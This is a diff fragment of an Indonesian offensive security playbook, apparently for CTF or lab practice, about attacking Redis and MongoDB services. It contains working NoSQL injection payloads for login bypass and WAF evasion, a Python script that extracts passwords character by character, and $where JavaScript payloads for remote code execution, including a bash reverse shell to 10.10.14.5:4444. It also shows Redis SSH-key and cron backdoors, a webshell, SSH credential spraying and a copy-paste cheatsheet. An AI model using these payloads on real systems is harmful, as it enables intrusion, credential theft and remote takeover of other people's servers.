+curl -H "Authorization: Bearer $JWT_TOKEN" "http://$TARGET/api/admin/users"
+
+# → Jika JWT, decode dulu: lihat <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
+# → Jika ada file upload: lihat <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
+```
+
+**OUTPUT GAGAL ❌ — Server error:**
+
+```text
+HTTP/1.1 500 Internal Server Error
+{"error":"Internal Server Error"}
+```
+
+➡️ Server crash karena injection! Tanda vulnerability ada tapi payload salah. Coba:
+
+```json
+// Lebih gentle:
+{"username":"admin","password":{"$gt":"a"}}
+```
+
+**OUTPUT GAGAL ❌ — WAF detected:**
+
+```text
+HTTP/1.1 403 Forbidden
+{"error":"Request blocked by security policy"}
+```
+
+➡️ Ada WAF. Coba bypass di Burp:
+
+**Teknik 1: URL encode payload di Burp:**  
+Klik kanan pada `$ne` di body → **Convert Selection > URL Encode**
+
+```text
+%24ne  (untuk $ne)
+%24gt  (untuk $gt)
+```
+
+**Teknik 2: Ubah Content-Type di Burp:**
+
+```text
+Content-Type: application/json;charset=UTF-8
+Content-Type: application/json; charset=utf-8
+Content-Type: text/json
+```
+
+**Teknik 3: Tambah/hapus whitespace:**
+
+```json
+{  "username"  :  "admin"  ,  "password"  :  {  "$ne"  :  ""  }  }
+```
+
+---
+
+### Langkah 6.4 — Burp Intruder untuk Enumerate Data (NoSQL Blind Injection)
+
+> **Scenario:** Login bypass berhasil tapi tidak bisa langsung lihat data. Gunakan Burp Intruder untuk extract data karakter per karakter.
+
+**STEP 1: Identifikasi response perbedaan (true vs false)**
+
+```json
+// TRUE condition (user ada):
+{"username":"admin","password":{"$ne":""}}
+// Response: 200 OK dengan token
+
+// FALSE condition (user tidak ada):
+{"username":"NONEXISTENT_USER_XYZ","password":{"$ne":""}}
+// Response: 401 atau {"error":"User not found"}
+```
+
+**STEP 2: Gunakan $regex untuk extract password karakter per karakter**
+
+Di Burp Repeater, test payload regex:
+
+```json
+// Cek apakah password admin diawali dengan 'a':
+{"username":"admin","password":{"$regex":"^a"}}
+
+// Cek apakah password admin diawali dengan 'b':
+{"username":"admin","password":{"$regex":"^b"}}
+
+// Automasi dengan Burp Intruder:
+// Body: {"username":"admin","password":{"$regex":"^§a§"}}
+// § § = injection point untuk Intruder
+```
+
+**STEP 3: Setup Burp Intruder**
+
+1. Di Repeater, klik kanan → **Send to Intruder**
+2. Tab **Positions**: Highlight `a` dalam `"^a"`, klik **Add §**
+3. Tab **Payloads**:
+    - Payload type: **Simple list**
+    - Tambahkan: `a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 ! @ # $ % & *`
+4. Tab **Settings** > **Grep - Match**: tambahkan kata dari response sukses (misal: `"token"` atau `"success":true`)
+5. Klik **Start attack**
+
+**OUTPUT BERHASIL ✅ — Intruder menemukan karakter:**
+
+```text
+Payload: 'a'  → Response length: 287 (berbeda!)  ← Password dimulai 'a'
+Payload: 'b'  → Response length: 156 (sama)
+Payload: 'c'  → Response length: 156 (sama)
+...
+```
+
+➡️ Iterasi untuk karakter berikutnya:
+
+```json
+// Setelah tahu karakter pertama 'a', cari karakter kedua:
+{"username":"admin","password":{"$regex":"^ad"}}
+{"username":"admin","password":{"$regex":"^ae"}}
+// dst...
+```
+
+**Atau automasi dengan Python:**
+
+```python
+#!/usr/bin/env python3
+import requests
+import string
+
+TARGET = "http://10.10.11.200"
+CHARSET = string.ascii_lowercase + string.digits + string.punctuation
+
+password = ""
+while True:
+    found = False
+    for char in CHARSET:
+        test = password + char
+        payload = {"username": "admin", "password": {"$regex": f"^{test}"}}
+        r = requests.post(f"{TARGET}/api/login", json=payload, timeout=5)
+        if r.status_code == 200 and "token" in r.text:
+            password = test
+            print(f"[+] Found so far: {password}")
+            found = True
+            break
+    if not found:
+        print(f"[*] Complete password: {password}")
+        break
+```
+
+**OUTPUT BERHASIL ✅:**
+
+```text
+[+] Found so far: a
+[+] Found so far: ad
+[+] Found so far: adm
+[+] Found so far: admi
+[+] Found so far: admin
+[+] Found so far: admin1
+[+] Found so far: admin12
+[+] Found so far: admin123
+[*] Complete password: admin123!
+```
+
+---
+
+### Langkah 6.5 — Burp untuk Enumerate MongoDB Collections (Data Extraction)
+
+> **Scenario:** Setelah bypass login, explore endpoint lain yang mungkin vulnerable.
+
+**STEP 1: Explore endpoint dengan injection di Burp Repeater**
+
+```json
+// Endpoint search/filter yang mungkin vulnerable
+GET /api/users?search=admin
+GET /api/users?id=1
+
+// Coba inject di parameter search:
+GET /api/users?search[$ne]=nonexistent
+GET /api/users?username[$regex]=.*
+
+// POST endpoint:
+{"search":{"$where":"function(){return true;}"}}
+{"filter":{"$ne":null}}
+```
+
+**STEP 2: Di Burp Repeater — test parameter injection**
+
+Jika ada endpoint `/api/search`:
+
+```json
+// Request normal:
+POST /api/search HTTP/1.1
+{"query":"laptop"}
+
+// Injection:
+{"query":{"$ne":"nonexistent_item_xyz"}}
+// Jika return semua data → VULNERABLE!
+
+// Extract user data:
+{"$where":"function(){return this.role=='admin';}"}
+// Versi lama MongoDB
+
+// Modern MongoDB — gunakan $regex:
+{"username":{"$regex":"admin.*"}}
+```
+
+**OUTPUT BERHASIL ✅ — Semua data ter-dump:**
+
+```json
+HTTP/1.1 200 OK
+
 [
-  {"_id": "...", "username": "admin", "email": "admin@corp.com"},
-  {"_id": "...", "username": "john", "email": "john@corp.com"}
+  {"_id":"...","username":"admin","email":"admin@corp.com","role":"administrator"},
+  {"_id":"...","username":"john","email":"john@corp.com","role":"user"},
+  {"_id":"...","username":"jane","email":"jane@corp.com","role":"user"}
 ]
 ```
 
----
+➡️ Simpan semua data:
 
-### Langkah 7.2 — NoSQL Injection Payloads Lengkap
-
-Bash
-
-```
-# ===== URL PARAMETER PAYLOADS =====
-# Basic $ne bypass
-curl "http://$TARGET/login?username=admin&password[$ne]=x"
-
-# $gt bypass
-curl "http://$TARGET/login?username=admin&password[$gt]="
-
-# $regex bypass (match anything)
-curl "http://$TARGET/login?username=admin&password[$regex]=.*"
-
-# Array bypass
-curl "http://$TARGET/login?username=admin&password[$in][]=admin&password[$in][]=password"
-
-# ===== JSON BODY PAYLOADS =====
-# Payload 1: $ne (tidak sama dengan)
-curl -X POST "http://$TARGET/api/auth" \
+```bash
+# Simpan dari Burp Response ke file (copy-paste atau)
+curl -X POST "http://$TARGET/api/search" \
     -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$ne":""}}'
+    -d '{"query":{"$ne":"xyz"}}' \
+    --proxy http://127.0.0.1:8080 \
+    > ~/redis_mongo_loot/mongo/dumped_users.json
 
-# Payload 2: Bypass semua user (tidak perlu tahu username)
-curl -X POST "http://$TARGET/api/auth" \
-    -H "Content-Type: application/json" \
-    -d '{"username":{"$ne":"nonexistent"},"password":{"$ne":"nonexistent"}}'
-
-# Payload 3: $gt (lebih besar dari string kosong = semua string)
-curl -X POST "http://$TARGET/api/auth" \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$gt":""}}'
-
-# Payload 4: $exists (field ada) 
-curl -X POST "http://$TARGET/api/auth" \
-    -H "Content-Type: application/json" \
-    -d '{"username":{"$exists":true},"password":{"$exists":true}}'
-
-# Payload 5: $or untuk enumerate users
-curl -X POST "http://$TARGET/api/auth" \
-    -H "Content-Type: application/json" \
-    -d '{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}'
-
-# ===== AUTOMATED TOOL =====
-# Gunakan NoSQLMap
-git clone https://github.com/codingo/NoSQLMap.git /tmp/nosqlmap
-cd /tmp/nosqlmap
-python3 nosqlmap.py
-
-# Atau dengan mongoBuster
-# pip install mongobuster
-```
-
-**OUTPUT BERHASIL ✅ — Semua bypass berhasil:**
-
-text
-
-```
-{"status":"success","user":{"id":1,"role":"admin","token":"eyJ..."}}
-```
-
-➡️ Gunakan token untuk akses fitur admin.
-
-**OUTPUT GAGAL ❌ — Semua payload return error:**
-
-text
-
-```
-{"error":"Invalid credentials"}
-{"status":"fail","message":"Username or password incorrect"}
-```
-
-➡️ Mungkin:
-
-1. Input sanitasi berjalan → coba encoding berbeda
-2. Framework yang dipakai mungkin escape operator MongoDB
-3. Cek apakah ada WAF
-
-Bash
-
-```
-# Coba encoding alternatives
-# Double encoding
-curl -X POST "http://$TARGET/login" \
-    -d 'username=admin&password%5B%24ne%5D=wrong'  # %5B = [ , %5D = ]
-
-# Content-Type berbeda
-curl -X POST "http://$TARGET/login" \
-    -H "Content-Type: application/x-www-form-urlencoded" \
-    -d 'username=admin&password[$ne]=wrong'
-
-# Cek apakah error message berubah = injection mungkin berhasil sebagian
-# Google: "nosql injection bypass WAF mongodb"
+cat ~/redis_mongo_loot/mongo/dumped_users.json | python3 -m json.tool
 ```
 
 ---
 
-### Langkah 7.3 — $where Injection (RCE di MongoDB Lama)
+### Langkah 6.6 — $where Injection via Burp (RCE di MongoDB Lama)
 
-> **HANYA untuk MongoDB versi lama** yang masih support `$where`. Deprecated di versi modern tapi masih ada di CTF legacy.
+> **HANYA untuk MongoDB versi lama** yang masih support `$where`. Deprecated di versi modern tapi masih muncul di CTF.
 
-Bash
+**STEP 1: Test apakah $where masih bekerja — di Burp Repeater:**
 
-```
-# Test apakah $where masih bekerja
-curl -X POST "http://$TARGET/api/search" \
-    -H "Content-Type: application/json" \
-    -d '{"$where":"function(){return true;}"}'
+```json
+// Test $where basic (time-based detection):
+POST /api/search HTTP/1.1
+Content-Type: application/json
 
-# Jika berhasil (return data), coba RCE:
-# Payload 1: Time-based blind (deteksi injection)
-curl -X POST "http://$TARGET/api/search" \
-    -H "Content-Type: application/json" \
-    -d '{"$where":"function(){sleep(3000);return true;}"}' \
-    --max-time 10 -w "Time: %{time_total}s\n"
-# Jika response > 3 detik → RCE confirmed
-
-# Payload 2: Command execution
-curl -X POST "http://$TARGET/api/search" \
-    -H "Content-Type: application/json" \
-    -d '{"$where":"function(){return this.constructor.constructor(\"return process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString()\")()}"}'
+{"$where":"function(){sleep(3000);return true;}"}
 ```
 
-**OUTPUT BERHASIL ✅ — Time delay:**
+Perhatikan **response time** di Burp (pojok kanan bawah Repeater):
 
-text
+- Normal: `< 500ms`
+- Dengan sleep(3000): `> 3000ms` → **$where WORKS = RCE confirmed!**
 
+**STEP 2: Command execution via $where di Burp Repeater:**
+
+```json
+// Payload RCE via Node.js process (versi lama):
+{
+  "$where": "function(){return this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()"
+}
+
+// Atau via eval:
+{
+  "username": "admin",
+  "$where": "function(){var x=this.constructor.constructor('return process.mainModule');var r=x().require('child_process').execSync('id').toString();return r.length>0;}"
+}
 ```
-Time: 3.124s   # → RCE via $where confirmed!
-```
+
+**Di Burp Repeater:**
+
+1. Paste payload di body
+2. Klik **Send**
+3. Perhatikan response — jika ada output `uid=...` → RCE!
 
 **OUTPUT BERHASIL ✅ — Command execution:**
 
-JSON
+```json
+HTTP/1.1 200 OK
 
+{
+  "result": [
+    {"output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
+  ]
+}
 ```
-{"result": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
+
+**STEP 3: Dari Burp Repeater, trigger reverse shell:**
+
+```bash
+# Setup listener dulu di terminal
+nc -lvnp $LPORT
+
+# Di Burp Repeater — kirim payload reverse shell:
 ```
 
-➡️ Spawn reverse shell:
-
-Bash
-
+```json
+{
+  "$where": "function(){return this.constructor.constructor('return process.mainModule.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\\\"\")')()}"
+}
 ```
-# URL encode payload untuk reverse shell
-REVSHELL_PAYLOAD='{"$where":"function(){return this.constructor.constructor(\"return process.mainModule.require('"'"'child_process'"'"').execSync('"'"'bash -c \\\"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\\\"'"'"').toString()\")()}"}'
 
-# Ganti LHOST dan LPORT
-echo $REVSHELL_PAYLOAD | sed "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g" > /tmp/payload.json
+**OUTPUT BERHASIL ✅ — Shell di listener:**
 
-# Setup listener
-nc -lvnp $LPORT &
+```text
+$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.200 53221
+bash: cannot set terminal process group: Inappropriate ioctl
+bash: no job control in this shell
+www-data@target:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-# Send payload
-curl -X POST "http://$TARGET/api/search" \
-    -H "Content-Type: application/json" \
-    -d @/tmp/payload.json
+➡️ Shell didapat! Upgrade dan lanjut ke privesc:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
 ```
 
 **OUTPUT GAGAL ❌ — $where disabled:**
 
-text
-
-```
+```json
 {"error":"$where is not allowed"}
 ```
 
-➡️ MongoDB terbaru (5.x+) sudah disable `$where`. Fokus ke operator lain seperti `$ne`, `$regex` untuk data extraction.
+➡️ MongoDB terbaru (5.x+) sudah disable `$where`. Kembali ke Langkah 6.4 dengan metode `$regex` untuk data extraction.
 
 ---
 
-## ══════════════════════════════════════════
+### Langkah 6.7 — Burp Scan Otomatis untuk NoSQL Injection
 
-## FASE 8: ATTACK CHAINS (CROSS-SERVICE)
+> Gunakan fitur **Burp Scanner** (Burp Pro) atau extension untuk scan otomatis.
 
-## ══════════════════════════════════════════
+**Dengan Burp Pro:**
+
+1. Klik kanan pada request di Proxy History
+2. Pilih **Scan** → **Active Scan**
+3. Centang **Injection flaws** dan **NoSQL injection**
+4. Klik **OK**
+
+**Dengan Extension (Burp Community):**
+
+```bash
+# Install extension "NoSQL Scanner" atau "JSON Injector"
+# Burp > Extensions > BApp Store > Search "NoSQL"
+
+# Atau manual dengan Burp Intruder + wordlist NoSQL
+# Download: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+```
+
+**Wordlist NoSQL payloads untuk Burp Intruder:**
+
+```text
+{"$gt":""}
+{"$ne":""}
+{"$regex":".*"}
+{"$exists":true}
+{"$where":"1==1"}
+{"$in":[""]}
+{"$nin":[""]}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce
+```
+
+---
+
+## ═══════════════════════════════════════
+
+## FASE 7: ATTACK CHAINS (CROSS-SERVICE)
+
+## ═══════════════════════════════════════
 
 ### Chain 1: Redis → SSH Key → Lateral Movement
 
-Bash
-
-```
+```bash
 # 1. Redis unauthenticated
 redis-cli -h $TARGET PING  # → +PONG
 
@@ -3936,21 +3794,16 @@ redis-cli -h $TARGET SAVE
 ssh -i ~/.ssh/redis_exploit redis@$TARGET
 
 # 5. Di dalam shell — cari credential untuk pivot
-cat /etc/passwd
+cat /home/redis/.bash_history  # SERING ADA CREDS DI SINI!
 find / -name "*.conf" -readable 2>/dev/null | xargs grep -i password 2>/dev/null
-cat /home/redis/.bash_history  # Sering ada credential di history!
 
 # 6. Cek network untuk lateral movement
-ss -tunp
-ip route
-arp -n
+ss -tunp; ip route; arp -n
 ```
 
 ### Chain 2: SMB → Creds → Redis Authenticated → Shell
 
-Bash
-
-```
+```bash
 # 1. Dari SMB loot (file .env yang di-download):
 cat ~/smb_loot/files/.env | grep -i redis
 # → REDIS_PASSWORD=FoundPassword123
@@ -3966,9 +3819,7 @@ redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS" PING
 
 ### Chain 3: MongoDB → Credentials → SSH/Web
 
-Bash
-
-```
+```bash
 # 1. MongoDB unauthenticated
 mongosh "mongodb://$TARGET:27017" --eval "show dbs" --quiet
 
@@ -3979,26 +3830,20 @@ mongosh "mongodb://$TARGET:27017/appdb" \
 # 3. Test credentials ke SSH
 while IFS=: read user pass; do
     sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$TARGET" "id" 2>/dev/null \
-        && echo "[+] SSH SUCCESS: $user:$pass"
+    && echo "[+] SSH SUCCESS: $user:$pass"
 done < ~/redis_mongo_loot/creds/mongo_creds.txt
-
-# 4. Test ke web login
-curl -X POST "http://$TARGET/login" -d "user=admin&pass=AdminP@ss2024!"
 ```
 
-### Chain 4: Web NoSQL Injection → Admin Access → File Upload → Shell
+### Chain 4: Web NoSQL Injection via Burp → Admin → File Upload → Shell
 
-Bash
+```bash
+# 1. Bypass login via Burp Repeater:
+# Body: {"username":"admin","password":{"$ne":""}}
+# → Dapat token/session
 
-```
-# 1. Bypass login
-curl -X POST "http://$TARGET/api/login" \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$ne":""}}' \
-    -c /tmp/mongo_cookies.txt
-
-# 2. Gunakan session untuk akses admin
-curl -b /tmp/mongo_cookies.txt "http://$TARGET/admin/" | grep -i "upload\|file\|command"
+# 2. Gunakan session untuk akses admin area
+curl -b "session=$SESSION_TOKEN" "http://$TARGET/admin/" \
+    | grep -i "upload\|file\|command"
 
 # 3. Jika ada file upload → upload webshell
 # → ke <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
@@ -4008,41 +3853,40 @@ curl -b /tmp/mongo_cookies.txt "http://$TARGET/admin/" | grep -i "upload\|file\|
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 |Error|Penyebab|Solusi|
 |---|---|---|
 |`NOAUTH Authentication required`|Redis punya password|Brute force dengan hydra atau cari di `.env`/config|
-|`CONFIG SET dir: Permission denied`|User Redis tidak bisa write ke dir tersebut|Coba `/tmp/`, `/var/lib/redis/`, atau direktori writable lain|
+|`CONFIG SET dir: Permission denied`|User Redis tidak bisa write ke dir|Coba `/tmp/`, `/var/lib/redis/`, atau dir writable lain|
 |`SAVE failed after redis db write`|Disk full atau permission denied saat write|`df -h`, ganti direktori|
 |`WRONGTYPE Operation`|Key bukan tipe string|Cek `TYPE key_name`, gunakan `HGETALL`/`LRANGE`/`SMEMBERS`|
 |`Connection refused`|Redis bind localhost atau protected-mode ON|Tunnel via SSH/LFI, atau cari cara bypass|
 |`ERR unknown command 'CONFIG'`|CONFIG command di-disable|Coba Lua RCE atau Module Loading|
 |`Permission denied (publickey)`|SSH key injection gagal|Cek permission `.ssh/`, coba path berbeda, pastikan newlines ada|
-|Cron tidak execute|Format salah, path salah, bukan root|Cek format, coba `/etc/cron.d/`, pastikan Redis root|
+|`Cron tidak execute`|Format salah, path salah, bukan root|Cek format, coba `/etc/cron.d/`, pastikan Redis root|
 |`MongoServerError: command find requires authentication`|MongoDB butuh auth|Login dengan `user:pass@host:port/db`|
 |`MongoNetworkError: ECONNREFUSED`|MongoDB tidak jalan atau port blocked|Cek `systemctl status mongodb`, cek firewall|
 |`MongoServerError: not authorized`|User tidak punya privilege|Coba database lain, atau user yang lebih tinggi|
 |`mongosh: command not found`|Mongosh tidak terinstall|`sudo apt install mongodb-mongosh -y`|
-|NoSQL injection tidak berhasil|Sanitasi atau WAF|Coba encoding berbeda, content-type lain, timing-based blind|
+|`NoSQL injection tidak berhasil (form)`|Sanitasi atau WAF|Coba ubah Content-Type ke JSON di Burp, atau encoding berbeda|
 |`$where is not allowed`|MongoDB 5.x+ disable `$where`|Gunakan `$ne`, `$regex`, `$gt` operator lain|
-|KEYS * hang|Terlalu banyak keys|Gunakan `SCAN 0` atau `SCAN 0 MATCH pattern*`|
+|`KEYS * hang`|Terlalu banyak keys|Gunakan `SCAN 0` atau `SCAN 0 MATCH pattern*`|
+|`HTTP 403 di Burp`|WAF blocking payload|URL-encode `$` → `%24`, ubah Content-Type, tambah whitespace|
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
 ## MASTER DECISION TREE
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-text
-
-```
+```text
 PORT 6379 (Redis) OPEN
 │
 ├─ redis-cli PING → +PONG?
@@ -4064,9 +3908,9 @@ PORT 27017 (MongoDB) OPEN
 │   ├─ YES: UNAUTHENTICATED!
 │   │   ├─ show dbs → list semua database
 │   │   ├─ use appdb → show collections → db.collection.find()
-│   │   ├─ [Creds di collection] → Test SSH/Web login
-│   │   ├─ [Flag di collection]  → Submit flag!
-│   │   └─ [Hash ditemukan]      → Crack dengan hashcat -m 24100
+│   │   ├─ [Creds di collection]  → Test SSH/Web login
+│   │   ├─ [Flag di collection]   → Submit flag!
+│   │   └─ [Hash ditemukan]       → Crack dengan hashcat -m 24100
 │   └─ NO: Auth required
 │       ├─ Default creds / brute force
 │       └─ [Creds found] → Sama seperti Unauthenticated path
@@ -4074,29 +3918,30 @@ PORT 27017 (MongoDB) OPEN
 PORT 80/443 + MongoDB/Redis backend
 │
 └─ Web app menggunakan NoSQL?
-    ├─ Test: username[$ne]=1&password[$ne]=1
-    ├─ [Login bypass] → Admin access → Cari RCE point
-    └─ [$where works] → RCE via JavaScript execution
+    ├─ IDENTIFIKASI: form-encoded atau JSON?
+    ├─ BURP INTERCEPT → Send to Repeater
+    ├─ TEST payload $ne, $gt, $regex satu per satu
+    ├─ [Login bypass]     → Admin access → Cari RCE point (upload/cmd)
+    ├─ [$where works]     → RCE via JavaScript execution
+    └─ [Blind injection]  → Burp Intruder + $regex → Extract data char by char
 ```
 
 ---
 
 ## ⚡ CHEATSHEET — COPY PASTE READY
 
-Bash
-
-```
+```bash
 # === SETUP ===
 export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
-export REDIS_PASS=""   # Isi jika ada password
-mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys}
+export REDIS_PASS=""  # Isi jika ada password
+mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys,burp}
 
 # === REDIS QUICK CHECK ===
-redis-cli -h $TARGET PING                              # Unauthenticated?
-redis-cli -h $TARGET -a "$REDIS_PASS" PING             # Authenticated?
-redis-cli -h $TARGET INFO server                       # Server info
-redis-cli -h $TARGET CONFIG GET dir                    # Working dir
-redis-cli -h $TARGET KEYS "*"                          # All keys
+redis-cli -h $TARGET PING                          # Unauthenticated?
+redis-cli -h $TARGET -a "$REDIS_PASS" PING         # Authenticated?
+redis-cli -h $TARGET INFO server                   # Server info
+redis-cli -h $TARGET CONFIG GET dir                # Working dir
+redis-cli -h $TARGET KEYS "*"                      # All keys
 
 # === REDIS SSH KEY INJECTION ===
 ssh-keygen -t rsa -f ~/.ssh/redis_exploit -N ""
@@ -4105,7 +3950,7 @@ redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh/
 redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
 redis-cli -h $TARGET SET pk "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n"
 redis-cli -h $TARGET SAVE
-ssh -i ~/.ssh/redis_exploit redis@$TARGET              # Login
+ssh -i ~/.ssh/redis_exploit redis@$TARGET           # Login
 
 # === REDIS CRON BACKDOOR ===
 redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs/
@@ -4121,7 +3966,7 @@ redis-cli -h $TARGET SAVE
 curl "http://$TARGET/shell.php?cmd=id"
 
 # === MONGODB QUICK CHECK ===
-mongosh "mongodb://$TARGET:27017" --eval "show dbs" --quiet     # Unauth?
+mongosh "mongodb://$TARGET:27017" --eval "show dbs" --quiet          # Unauth?
 mongosh "mongodb://$TARGET:27017" --eval "db.version()" --quiet
 
 # === MONGODB DUMP ALL ===
@@ -4129,31 +3974,43 @@ mongosh "mongodb://$TARGET:27017/appdb" --eval "show collections" --quiet
 mongosh "mongodb://$TARGET:27017/appdb" --eval "db.users.find().pretty()" --quiet
 mongosh "mongodb://$TARGET:27017/admin" --eval "db.system.users.find().pretty()" --quiet
 
-# === NOSQL INJECTION (URL encoded) ===
+# === NOSQL INJECTION (URL encoded — terminal) ===
 curl -X POST "http://$TARGET/login" -d "username=admin&password[\$ne]=x"
 curl -X POST "http://$TARGET/login" -d "username=admin&password[\$gt]="
 curl -X POST "http://$TARGET/login" -d "username[\$ne]=x&password[\$ne]=x"
 
-# === NOSQL INJECTION (JSON) ===
+# === NOSQL INJECTION (JSON — terminal) ===
 curl -X POST "http://$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$ne":""}}'
-
 curl -X POST "http://$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'
 
+# === NOSQL INJECTION (via Burp — copy paste ke Repeater body) ===
+# Form-encoded:
+# username=admin&password[$ne]=wrong
+# username[$ne]=x&password[$ne]=x
+
+# JSON:
+# {"username":"admin","password":{"$ne":""}}
+# {"username":{"$ne":"x"},"password":{"$ne":"x"}}
+# {"username":"admin","password":{"$regex":".*"}}
+# {"$where":"function(){sleep(3000);return true;}"}  ← Time-based test
+
 # === HASH CRACKING ===
-hashcat -m 24100 mongo_hash.txt /usr/share/wordlists/rockyou.txt    # SCRAM-SHA-256
-hashcat -m 24200 mongo_hash.txt /usr/share/wordlists/rockyou.txt    # SCRAM-SHA-1
-hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379      # Redis brute
+hashcat -m 24100 mongo_hash.txt /usr/share/wordlists/rockyou.txt  # SCRAM-SHA-256
+hashcat -m 24200 mongo_hash.txt /usr/share/wordlists/rockyou.txt  # SCRAM-SHA-1
+hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379    # Redis brute
 ```
 
 ---
 
-> **➡️ NEXT:** Setelah Redis/MongoDB selesai dan dapat credentials atau shell, lanjut ke:
+> **➡️ NEXT:**
 > 
-> - Shell di Linux → **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`**
-> - Credentials ditemukan → Test ke semua service, lihat **Cross-Service Chart** di Fase 5.2
-> - Ada web server → **`<a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>`**
-> - Environment AD → **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`**
+> - **Shell di Linux** → `<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`
+> - **Credentials ditemukan** → Test ke semua service, lihat Cross-Service Chart di Fase 4.2
+> - **Ada web server** → `<a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>`
+> - **Environment AD** → `<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`
+> - **JWT token didapat** → `<a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>`
+> - **File upload tersedia** → `<a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>`
